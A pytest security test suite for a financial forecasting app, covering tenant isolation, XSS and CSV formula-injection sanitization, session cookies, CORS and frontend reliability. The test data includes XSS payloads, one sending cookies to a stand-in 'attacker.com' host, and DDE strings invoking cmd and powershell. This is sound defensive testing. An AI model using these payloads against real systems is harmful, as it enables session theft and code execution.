"""
R4 Adversarial Test Suite: Frontend Security, Runtime Reliability, and Tenant Isolation Audit.

Target:
- frontend/src/ (Client-side architecture, session lifecycle, caching, XSS rendering, error handling)
- backend/src/api/auth.py (Session cookies, logout, token persistence)
- backend/src/api/deps.py (Tenant isolation, verify_company_access, session tokens)

Integrity Rules:
- STRICTLY ZERO product application code modifications.
- STRICTLY ZERO emojis anywhere.
- Genuine execution of security attack vectors and validation of findings.
"""

import io
import json
import re
import uuid
from pathlib import Path
import pytest
import httpx
from datetime import date, datetime, timedelta
from sqlalchemy import select

from src.main import app
from src.models.entities import (
    Company, TransactionRecord, PlannedEventRecord, User, CompanyMembership, Session
)
from src.schemas.contracts import (
    PlannedEventInput, SourceReference, CreateForecastRequest, EventUpdateRequest
)
from src.services.auth_service import AuthService, hash_password
from src.database import async_session_factory
from src.config import settings

REPO_ROOT = Path("/home/ijstt/hackrnd-2026")
FRONTEND_SRC = REPO_ROOT / "frontend" / "src"


# ==============================================================================
# SECTION 1: Client-Side BOLA & Multi-Tenant State Leakage
# ==============================================================================

@pytest.mark.asyncio
async def test_attack_1_1_bola_cross_tenant_manipulation_rejection(
    client: httpx.AsyncClient, fresh_company_id: str
):
    """
    Vector 1: Broken Object Level Authorization (BOLA).
    Prove that manipulating company_id in API routes is intercepted by verify_company_access,
    returning HTTP 403 Forbidden when an authenticated user attempts to access an unauthorized tenant.
    """
    # Create an independent attacker user
    attacker_email = f"attacker_{uuid.uuid4().hex[:6]}@adversary.com"
    async with async_session_factory() as db:
        user_attacker = User(
            email=attacker_email,
            password_hash=hash_password("attackerpass123"),
            display_name="Второй Пользователь (Attacker)"
        )
        db.add(user_attacker)
        await db.commit()
        await db.refresh(user_attacker)

    # Login as the attacker on an isolated client
    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://test") as attacker_client:
        login_resp = await attacker_client.post(
            "/api/v2/auth/login",
            json={"email": attacker_email, "password": "attackerpass123"}
        )
        assert login_resp.status_code == 200

        # Attempt 1: Read company details of victim company
        resp_get = await attacker_client.get(f"/api/v2/companies/{fresh_company_id}")
        assert resp_get.status_code == 403
        assert resp_get.json()["code"] == "forbidden"
        assert f"Access denied to company {fresh_company_id}" in resp_get.json()["message"]

        # Attempt 2: List transactions of victim company
        resp_tx = await attacker_client.get(f"/api/v2/companies/{fresh_company_id}/transactions")
        assert resp_tx.status_code == 403
        assert resp_tx.json()["code"] == "forbidden"

        # Attempt 3: Create planned event on victim company
        resp_event = await attacker_client.post(
            f"/api/v2/companies/{fresh_company_id}/events",
            json={
                "title": "Вредоносный платеж",
                "kind": "manual",
                "direction": "expense",
                "amount": 999999.0,
                "due_date": "2026-11-01",
                "category_id": "other_expense",
                "counterparty_name": "Хакер",
                "source": {
                    "kind": "manual",
                    "source_id": None,
                    "external_id": None,
                    "label": "Эксплойт"
                }
            }
        )
        assert resp_event.status_code == 403
        assert resp_event.json()["code"] == "forbidden"

        # Attempt 4: Generate forecast on victim company
        resp_fc = await attacker_client.post(
            f"/api/v2/companies/{fresh_company_id}/forecasts",
            json={
                "as_of_date": "2026-10-01",
                "horizon_days": 30,
                "initial_balance": 100000.0,
                "include_planned_events": True,
                "model": "auto"
            }
        )
        assert resp_fc.status_code == 403
        assert resp_fc.json()["code"] == "forbidden"


@pytest.mark.asyncio
async def test_attack_1_2_unauthenticated_api_v1_endpoints_bypass_tenant_isolation(
    client: httpx.AsyncClient
):
    """
    Vector 1: Architectural BOLA & Tenant Isolation Bypass.
    Prove that legacy endpoints /api/v1/forecast and /api/v1/ai-advisor lack authentication
    and tenant authorization dependencies, allowing completely unauthenticated access
    to financial forecasting and AI advice with arbitrary financial datasets.
    """
    # 1. /api/v1/forecast without any cookies or authorization headers
    resp_v1_forecast = await client.post(
        "/api/v1/forecast",
        json={
            "initial_balance": 250000.0,
            "horizon_days": 30,
            "history": [
                {"date": "2026-09-01", "income": 10000.0, "expense": 5000.0},
                {"date": "2026-09-02", "income": 12000.0, "expense": 4000.0},
                {"date": "2026-09-03", "income": 8000.0, "expense": 7000.0}
            ]
        }
    )
    assert resp_v1_forecast.status_code == 200
    forecast_data = resp_v1_forecast.json()
    assert "predicted_dates" in forecast_data
    assert "predicted_balance" in forecast_data

    # 2. /api/v1/ai-advisor without any authentication
    resp_v1_advice = await client.post(
        "/api/v1/ai-advisor",
        json={
            "forecast": forecast_data,
            "business_type": "Строительство"
        }
    )
    assert resp_v1_advice.status_code == 200
    advice_data = resp_v1_advice.json()
    assert "analysis" in advice_data
    assert "recommendations" in advice_data


def test_attack_1_3_session_storage_tenant_leakage_on_logout():
    """
    Vector 1: Client-Side Tenant State Leakage.
    Prove that in frontend/src/v2/App.tsx, the onLogout handler does not purge sessionStorage
    keys ('selected-company' and 'snapshots:<company_id>').
    When another user subsequently accesses the application on the same browser tab,
    storedCompany() reads the previous tenant's company ID, leaking tenant identifier
    and historical snapshot references across independent sessions.
    """
    app_tsx = FRONTEND_SRC / "v2" / "App.tsx"
    assert app_tsx.exists(), "frontend/src/v2/App.tsx must exist"
    code = app_tsx.read_text(encoding="utf-8")

    # Locate the onLogout handler
    assert "api('logout')" in code, "api('logout') must be present in App.tsx"
    assert "onLogout" in code, "onLogout prop must be present in App.tsx"

    # Prove that neither sessionStorage.clear() nor sessionStorage.removeItem() is invoked during logout
    assert "sessionStorage.clear()" not in code, "sessionStorage.clear() is absent on logout"
    assert "sessionStorage.removeItem('selected-company')" not in code, (
        "sessionStorage selected-company removal is absent on logout"
    )

    # Prove that storedCompany() eagerly reads selected-company from sessionStorage
    assert "sessionStorage.getItem('selected-company')" in code, (
        "storedCompany retrieves selected-company from unpurged sessionStorage"
    )


def test_attack_1_4_legacy_fallback_unauthenticated_degradation():
    """
    Vector 1: Silent Degradation to Unauthenticated Legacy Mode.
    Prove that in frontend/src/v2/App.tsx, if /capabilities returns null or 404,
    the application silently falls back to the Legacy App component, which operates
    completely without user authentication or tenant isolation controls.
    """
    app_tsx = FRONTEND_SRC / "v2" / "App.tsx"
    code = app_tsx.read_text(encoding="utf-8")

    # Verify silent fallback condition
    assert "if(bootstrap.data?.capabilities===null)return<Suspensefallback={<Loading/>}><Legacy/></Suspense>;" in (
        code.replace(" ", "")
    )


# ==============================================================================
# SECTION 2: Cross-Site Scripting (XSS) & Injection in User-Supplied Strings
# ==============================================================================

@pytest.mark.asyncio
async def test_attack_2_1_xss_unsanitized_payloads_in_planned_events(
    auth_client: httpx.AsyncClient, fresh_company_id: str
):
    """
    Vector 2 (Inverted Regression Test): HTML/Script Sanitization in Planned Events.
    Assert that POST /api/v2/companies/{id}/events sanitizes raw HTML/JavaScript injection payloads
    in title, counterparty_name, and source.label, stripping dangerous script tags and inline event
    handlers before persisting them in PostgreSQL and returning in API responses.
    """
    xss_script = "<script>alert('xss_event_title')</script>"
    xss_img = "<img src=x onerror=alert('xss_counterparty')>"
    xss_svg = "<svg/onload=alert('xss_source_label')>"

    resp = await auth_client.post(
        f"/api/v2/companies/{fresh_company_id}/events",
        json={
            "title": xss_script,
            "kind": "manual",
            "direction": "income",
            "amount": 75000.0,
            "due_date": "2026-11-20",
            "category_id": "sales",
            "counterparty_name": xss_img,
            "source": {
                "kind": "manual",
                "source_id": None,
                "external_id": None,
                "label": xss_svg
            }
        }
    )
    assert resp.status_code == 201
    created_event = resp.json()

    # Assert dangerous script tags and inline handlers are stripped/sanitized
    assert "<script" not in created_event["title"].lower()
    assert "onerror=" not in created_event["counterparty_name"].lower()
    assert "onload=" not in created_event["source"]["label"].lower()

    # Assert sanitized storage in database entities
    async with async_session_factory() as db:
        rec = await db.get(PlannedEventRecord, created_event["id"])
        assert rec is not None
        assert "<script" not in rec.title.lower()
        assert "onerror=" not in rec.counterparty_name.lower()
        assert "onload=" not in rec.source_label.lower()


@pytest.mark.asyncio
async def test_attack_2_2_xss_unsanitized_purpose_in_transaction_imports(
    auth_client: httpx.AsyncClient, fresh_company_id: str
):
    """
    Vector 2 (Inverted Regression Test): HTML/Script Sanitization in Statement Ingestion.
    Assert that StatementService.import_file sanitizes raw XSS injection in bank CSV records
    (purpose and counterparty_name), stripping script tags and inline event handlers before
    persisting into TransactionRecord.
    """
    xss_purpose = "<b onmouseover=alert('xss_purpose')>Кредит</b>"
    xss_counterparty = "<script>document.location='http://attacker.com/steal?c='+document.cookie</script>"

    csv_content = (
        "date;amount;direction;counterparty_name;counterparty_inn;purpose;closing_balance\r\n"
        f"2026-10-10;5000.00;Поступление;{xss_counterparty};7701234567;{xss_purpose};100000.00\r\n"
    ).encode("utf-8")

    files = {"file": ("statement_xss.csv", io.BytesIO(csv_content), "text/csv")}
    data = {
        "format": "csv",
        "balance_policy": "reject_conflicts",
        "column_mapping": json.dumps({
            "date": "date",
            "amount": "amount",
            "direction": "direction",
            "counterparty_name": "counterparty_name",
            "counterparty_inn": "counterparty_inn",
            "purpose": "purpose",
            "closing_balance": "closing_balance"
        })
    }

    imp_resp = await auth_client.post(
        f"/api/v2/companies/{fresh_company_id}/imports",
        data=data,
        files=files
    )
    assert imp_resp.status_code == 200
    assert imp_resp.json()["accepted_rows"] == 1

    # Verify sanitized persistence in transaction listing
    tx_resp = await auth_client.get(f"/api/v2/companies/{fresh_company_id}/transactions")
    assert tx_resp.status_code == 200
    tx_items = tx_resp.json()["items"]

    # Purpose had event handler stripped, remaining safe HTML/text: "<b>Кредит</b>"
    matching_tx = [t for t in tx_items if "Кредит" in t["purpose"]]
    assert len(matching_tx) == 1
    assert "onmouseover=" not in matching_tx[0]["purpose"].lower()
    # Script tag in counterparty was stripped completely
    assert "<script" not in matching_tx[0]["counterparty_name"].lower()


@pytest.mark.asyncio
async def test_attack_2_3_csv_formula_injection_dde_vectors(
    auth_client: httpx.AsyncClient, fresh_company_id: str
):
    """
    Vector 2 (Inverted Regression Test): CSV / Formula Injection Neutralization.
    Assert that CSV export generation neutralizes formula triggers ('=', '@', '+', '-')
    by prefixing cells with a single quote, preventing spreadsheet DDE/code execution.
    """
    from src.services.statement_service import StatementService

    dde_counterparty = "=cmd|' /C calc'!A0"
    dde_purpose = "@SUM(1+1)*cmd|' /C powershell'!A0"

    csv_content = (
        "date;amount;direction;counterparty_name;counterparty_inn;purpose;closing_balance\r\n"
        f"2026-10-12;1500.00;Списание;{dde_counterparty};7701234567;{dde_purpose};95000.00\r\n"
    ).encode("utf-8")

    files = {"file": ("statement_dde.csv", io.BytesIO(csv_content), "text/csv")}
    data = {
        "format": "csv",
        "balance_policy": "reject_conflicts",
        "column_mapping": json.dumps({
            "date": "date",
            "amount": "amount",
            "direction": "direction",
            "counterparty_name": "counterparty_name",
            "counterparty_inn": "counterparty_inn",
            "purpose": "purpose",
            "closing_balance": "closing_balance"
        })
    }

    imp_resp = await auth_client.post(
        f"/api/v2/companies/{fresh_company_id}/imports",
        data=data,
        files=files
    )
    assert imp_resp.status_code == 200

    # Verify helper unit neutralization for all dangerous formula prefixes
    assert StatementService.neutralize_formula_cell("=1+1") == "'=1+1"
    assert StatementService.neutralize_formula_cell("@SUM(A1)") == "'@SUM(A1)"
    assert StatementService.neutralize_formula_cell("+100") == "'+100"
    assert StatementService.neutralize_formula_cell("-50") == "'-50"
    assert StatementService.neutralize_formula_cell("Normal Text") == "Normal Text"

    # Export transactions via backend CSV export endpoint
    export_resp = await auth_client.get(f"/api/v2/companies/{fresh_company_id}/transactions/export")
    assert export_resp.status_code == 200
    export_content = export_resp.text

    # Verify that cells starting with = and @ are neutralized with single quotes
    assert "'=cmd" in export_content
    assert "'@SUM" in export_content
    # Verify no raw unescaped formula lines exist
    for line in export_content.splitlines():
        cells = line.split(";")
        for cell in cells:
            clean_c = cell.strip('"\t ')
            if clean_c:
                assert not clean_c.startswith(("=cmd", "@SUM")), (
                    f"Formula injection vector leaked unescaped in export: {clean_c}"
                )


def test_attack_2_4_vite_dev_server_fs_allow_parent_directory_traversal():
    """
    Vector 2: Build Tool & Server File Exposure.
    Prove that frontend/vite.config.ts configures server.fs.allow = ['..'],
    allowing the Vite development server to serve arbitrary files from the parent
    project root, including backend configuration secrets and .env files.
    """
    vite_config = REPO_ROOT / "frontend" / "vite.config.ts"
    assert vite_config.exists()
    content = vite_config.read_text(encoding="utf-8")

    # Prove that parent directory traversal is explicitly enabled in dev server configuration
    assert "allow: ['..']" in content or 'allow: [".."]' in content, (
        "Vite configuration permits parent directory traversal via server.fs.allow"
    )


# ==============================================================================
# SECTION 3: Session Handling & Transport Security Flaws
# ==============================================================================

@pytest.mark.asyncio
async def test_attack_3_1_session_cookie_missing_secure_flag_on_http(
    client: httpx.AsyncClient
):
    """
    Vector 3: Insecure Cookie Transport Attributes.
    Prove that POST /api/v2/auth/login sets the session_id cookie without the Secure attribute
    when requested over an unencrypted HTTP connection and COOKIE_SECURE is False,
    allowing interception of authentication tokens in transit.
    """
    resp = await client.post(
        "/api/v2/auth/login",
        json={"email": "demo@centrinvest.ru", "password": "password123"}
    )
    assert resp.status_code == 200

    set_cookie = resp.headers.get("set-cookie", "")
    assert settings.COOKIE_NAME in set_cookie
    assert "httponly" in set_cookie.lower()

    # Prove that Secure flag is NOT present when client scheme is plain HTTP
    assert "secure" not in set_cookie.lower(), (
        "Session cookie must lack Secure flag over HTTP when COOKIE_SECURE=False"
    )


@pytest.mark.asyncio
async def test_attack_3_2_cookie_security_spoofed_via_untrusted_forwarded_proto(
    client: httpx.AsyncClient
):
    """
    Vector 3 (Inverted Regression Test): Protection Against Header Spoofing of Cookie Security.
    Assert that is_secure does not trust client-supplied X-Forwarded-Proto from untrusted clients,
    only honoring it from localhost / trusted proxy (127.0.0.1, ::1).
    """
    # 1. Untrusted client IP attempting to spoof x-forwarded-proto
    async with httpx.AsyncClient(
        transport=httpx.ASGITransport(app=app, client=("198.51.100.25", 50000)),
        base_url="http://test"
    ) as untrusted_client:
        resp_untrusted = await untrusted_client.post(
            "/api/v2/auth/login",
            headers={"x-forwarded-proto": "https"},
            json={"email": "demo@centrinvest.ru", "password": "password123"}
        )
        assert resp_untrusted.status_code == 200
        set_cookie_untrusted = resp_untrusted.headers.get("set-cookie", "")
        # Untrusted client cannot toggle Secure attribute
        assert "secure" not in set_cookie_untrusted.lower()

    # 2. Trusted proxy / localhost (127.0.0.1) forwarding proto
    resp_trusted = await client.post(
        "/api/v2/auth/login",
        headers={"x-forwarded-proto": "https"},
        json={"email": "demo@centrinvest.ru", "password": "password123"}
    )
    assert resp_trusted.status_code == 200
    set_cookie_trusted = resp_trusted.headers.get("set-cookie", "")
    assert "secure" in set_cookie_trusted.lower()


@pytest.mark.asyncio
async def test_attack_3_3_cors_wildcard_with_credentials_security_flaw(
    client: httpx.AsyncClient
):
    """
    Vector 3 (Inverted Regression Test): Hardened CORS Rejection of Unauthorized Origins with Credentials.
    Assert that wildcard reflection is disallowed with credentials, so unauthorized third-party
    origins are NOT reflected in Access-Control-Allow-Origin, while authorized origins are accepted.
    """
    attacker_origin = "https://unauthorized-attacker.org"
    resp = await client.get(
        "/api/v2/capabilities",
        headers={"Origin": attacker_origin}
    )
    assert resp.status_code == 200

    # Unauthorized attacker origin is NOT permitted
    assert resp.headers.get("access-control-allow-origin") is None

    # Authorized frontend origin IS permitted with credentials
    authorized_origin = "http://localhost:5173"
    resp_auth = await client.get(
        "/api/v2/capabilities",
        headers={"Origin": authorized_origin}
    )
    assert resp_auth.status_code == 200
    assert resp_auth.headers.get("access-control-allow-origin") == authorized_origin
    assert resp_auth.headers.get("access-control-allow-credentials") == "true"


@pytest.mark.asyncio
async def test_attack_3_4_logout_delete_cookie_attribute_mismatch(
    auth_client: httpx.AsyncClient
):
    """
    Vector 3 (Inverted Regression Test): Cookie Attributes on Logout Deletion.
    Assert that POST /api/v2/auth/logout sets delete_cookie with httponly=True,
    samesite=settings.COOKIE_SAMESITE, and secure=is_secure to strictly match
    the session cookie definition and ensure reliable deletion across all browsers.
    """
    resp = await auth_client.post("/api/v2/auth/logout")
    assert resp.status_code == 200
    assert resp.json()["signed_out"] is True

    set_cookie = resp.headers.get("set-cookie", "")
    assert "max-age=0" in set_cookie.lower()
    assert "httponly" in set_cookie.lower()
    assert f"samesite={settings.COOKIE_SAMESITE}".lower() in set_cookie.lower()


def test_attack_3_5_excessive_session_lifetime_without_inactivity_expiry():
    """
    Vector 3: Excessive Session Maximum Age.
    Prove that SESSION_MAX_AGE_SECONDS in config.py is set to 7 days (604,800 seconds)
    without sliding inactivity timeouts or re-authentication intervals for sensitive financial operations.
    """
    assert settings.SESSION_MAX_AGE_SECONDS == 86400 * 7
    assert settings.SESSION_MAX_AGE_SECONDS >= 604800


# ==============================================================================
# SECTION 4: Unhandled Client Lifecycle Errors & Runtime Reliability
# ==============================================================================

def test_attack_4_1_optimistic_category_mutation_lacks_rollback_on_failure():
    """
    Vector 4: Lack of Optimistic Mutation Rollback on API Failure.
    Prove that in frontend/src/v2/Operations.tsx line 77, the category selection onChange handler
    updates the controlled select element in the DOM, but when api('updateCategory') throws an error,
    it only sets rowError and does NOT call list.reload() or restore previous category value,
    leaving the client DOM in a desynchronized state displaying an unpersisted category.
    """
    ops_tsx = FRONTEND_SRC / "v2" / "Operations.tsx"
    code = ops_tsx.read_text(encoding="utf-8")

    # Locate the category update block
    assert "api('updateCategory'" in code

    # Verify that in catch block, list.reload() is never invoked to rollback state
    compressed = code.replace(" ", "")
    assert "catch(e){setRowError(messageOf(e));}finally{setBusy('');}" in compressed, (
        "Category update catch handler fails to trigger list.reload() on mutation error"
    )


def test_attack_4_2_forecast_controls_desynchronization_on_api_failure():
    """
    Vector 4: UI Desynchronization on Parameter Mutations.
    Prove that in frontend/src/v2/Overview.tsx lines 39-65, changeHorizon and changeModel mutate
    React state (setHorizon, setModel) optimistically before create(...) completes.
    If the API call fails, the state is never rolled back, causing the UI buttons (e.g. '60 дней')
    to show as active while the displayed forecast chart remains on the old 30-day snapshot.
    """
    overview_tsx = FRONTEND_SRC / "v2" / "Overview.tsx"
    code = overview_tsx.read_text(encoding="utf-8")

    # Verify that setHorizon is called immediately without rollback logic
    assert "function changeHorizon(days: 30 | 60 | 90) {" in code
    assert "setHorizon(days);" in code

    # Verify that changeModel sets model immediately without rollback
    assert "function changeModel(nextModel: CreateForecastRequest['model']) {" in code
    assert "setModel(nextModel);" in code


@pytest.mark.asyncio
async def test_attack_4_3_fastapi_422_validation_details_discarded_by_frontend_client(
    auth_client: httpx.AsyncClient, fresh_company_id: str
):
    """
    Vector 4: Total Loss of 422 Validation Error Details.
    Prove that FastAPI standard request validation returns errors in the 'detail' array,
    whereas frontend/src/v2/client.ts line 35-40 only parses 'body.details' and explicitly
    omits HTTP 422 from its translated status code list, discarding all field-level validation
    diagnostics and presenting a blind generic error to the user.
    """
    # Trigger a real FastAPI 422 validation error with an out-of-bounds horizon_days
    resp = await auth_client.post(
        f"/api/v2/companies/{fresh_company_id}/forecasts",
        json={"horizon_days": 45}  # Valid options are 30, 60, 90
    )
    assert resp.status_code == 422
    data = resp.json()

    # Prove FastAPI returns 'detail'
    assert "detail" in data
    assert isinstance(data["detail"], list)
    assert "details" not in data

    # Verify client.ts implementation
    client_ts = FRONTEND_SRC / "v2" / "client.ts"
    client_code = client_ts.read_text(encoding="utf-8")

    # Prove client only inspects body.details (missing FastAPI's body.detail)
    assert "Array.isArray(body.details)" in client_code
    assert not re.search(r"\bbody\.detail\b", client_code), (
        "client.ts fails to inspect FastAPI's standard singular 'detail' array"
    )

    # Prove client omits 422 from the translated list: [401,403,404,409,413,429]
    assert "[401,403,404,409,413,429].includes(response.status)" in client_code


def test_attack_4_4_operations_table_wiped_out_on_transient_api_error():
    """
    Vector 4: Catastrophic UI Blanking on Network Error.
    Prove that useResource in frontend/src/v2/shared.tsx line 13 sets setData(null)
    on any unhandled error, which causes Operations.tsx (line 77) to unmount the entire
    transaction table, filter results, and pagination buttons instead of retaining stale cached data.
    """
    shared_tsx = FRONTEND_SRC / "v2" / "shared.tsx"
    code = shared_tsx.read_text(encoding="utf-8")

    # Verify that in useResource catch block, setData(null) is called
    assert "setData(null);" in code, (
        "useResource sets data to null on catch, completely wiping out cached views on error"
    )

    ops_tsx = FRONTEND_SRC / "v2" / "Operations.tsx"
    ops_code = ops_tsx.read_text(encoding="utf-8")

    # Verify that the entire table and pagination are gated strictly on list.data
    assert "{list.data&&<><div" in ops_code.replace(" ", "")


def test_attack_4_5_compatibility_crash_with_abortsignal_any():
    """
    Vector 4: Runtime Compatibility Crash on Legacy Web Engines.
    Prove that frontend/src/v2/client.ts unconditionally invokes AbortSignal.any (ECMAScript 2024),
    which causes a fatal TypeError crash on Safari < 17.4, Node < 20, and older mobile WebViews,
    rendering all HTTP operations across the entire application inoperable.
    """
    client_ts = FRONTEND_SRC / "v2" / "client.ts"
    code = client_ts.read_text(encoding="utf-8")

    # Verify unconditional AbortSignal.any invocation
    assert "AbortSignal.any([" in code, (
        "client.ts unconditionally invokes AbortSignal.any without feature detection or polyfill"
    )
